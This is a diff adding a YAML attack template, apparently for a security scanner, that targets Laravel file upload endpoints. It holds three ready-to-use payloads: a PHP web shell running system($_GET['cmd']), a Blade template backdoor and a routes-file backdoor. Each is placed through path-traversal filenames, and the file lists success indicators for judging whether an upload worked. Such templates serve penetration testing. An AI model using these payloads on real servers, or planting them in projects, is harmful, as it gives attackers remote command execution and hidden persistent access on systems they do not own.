@@ -1,0 +1,48 @@
+name: "Laravel File Upload Attack"
+description: "Tests Laravel file upload endpoints for common vulnerabilities"
+author: "@HaakimSec"
+version: "1.0"
+tech_stack: "php"
+
+target:
+  endpoint: "/api/upload"
+  method: "POST"
+  param: "file"
+
+headers:
+  Accept: "application/json"
+  X-Requested-With: "XMLHttpRequest"
+
+form_data:
+  _method: "POST"
+
+payloads:
+  - name: "PHP webshell via Laravel storage"
+    filename: "../../../storage/app/public/shell.php"
+    extension: ".php"
+    body: |
+      <?php system($_GET['cmd']); ?>
+    tags: ["laravel", "php", "path-traversal", "storage"]
+
+  - name: "PHP in blade template"
+    filename: "../../../resources/views/vendor/backdoor.blade.php"
+    extension: ".php"
+    body: |
+      @php system($_GET['cmd']); @endphp
+    tags: ["laravel", "blade", "template-injection"]
+
+  - name: "PHP in routes"
+    filename: "../../../routes/backdoor.php"
+    extension: ".php"
+    body: |
+      <?php Route::get('/backdoor', function(){ system(request('cmd')); }); ?>
+    tags: ["laravel", "routes", "backdoor"]
+
+success_indicators:
+  - "\"success\":true"
+  - "File uploaded"
+  - "Upload successful"
+
+failure_indicators:
+  - "File type not allowed"
+  - "Validation failed"
